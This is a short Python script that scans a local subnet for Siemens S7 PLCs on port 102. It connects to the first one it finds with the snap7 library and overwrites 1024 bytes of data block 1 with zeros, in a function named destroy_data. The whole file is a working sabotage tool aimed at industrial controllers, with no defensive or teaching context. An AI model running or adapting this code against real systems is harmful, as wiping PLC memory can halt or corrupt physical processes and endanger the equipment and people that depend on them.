import snap7
import socket
import subprocess

def find_plc_ip():
    # Example: Scan the local network for the PLC's IP address
    # This is a simple example and may need to be adjusted based on your network setup
    ip_range = "192.168.1."
    for i in range(1, 255):
        ip = ip_range + str(i)
        try:
            # Try to connect to the PLC on port 102 (S7 communication port)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.1)
                result = sock.connect_ex((ip, 102))
                if result == 0:
                    print(f"Found PLC at IP: {ip}")
                    return ip
        except Exception as e:
            print(f"Error scanning IP {ip}: {e}")
    print("PLC not found on the network.")
    return None

def destroy_data(plc_ip):
    try:
        # Initialize the Snap7 client
        client = snap7.client.Client()
        client.connect(plc_ip, 0, 1)  # Connect to the PLC

        # Example: Write zeros to the PLC's memory areas to simulate data destruction
        # This is a destructive operation and should be used with caution
        db_number = 1  # Data block number
        start_address = 0  # Starting address
        size = 1024  # Size of data to destroy (in bytes)
        data = bytearray(size)  # Create a byte array filled with zeros

        # Write the zeroed-out data to the PLC's memory
        client.db_write(db_number, start_address, data)
        print(f"Data destruction completed on PLC at IP: {plc_ip}")

    except Exception as e:
        print(f"Error during data destruction: {e}")
    finally:
        client.disconnect()

def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        destroy_data(plc_ip)
    else:
        print("PLC IP address not found. Exiting.")

if __name__ == "__main__":
    main()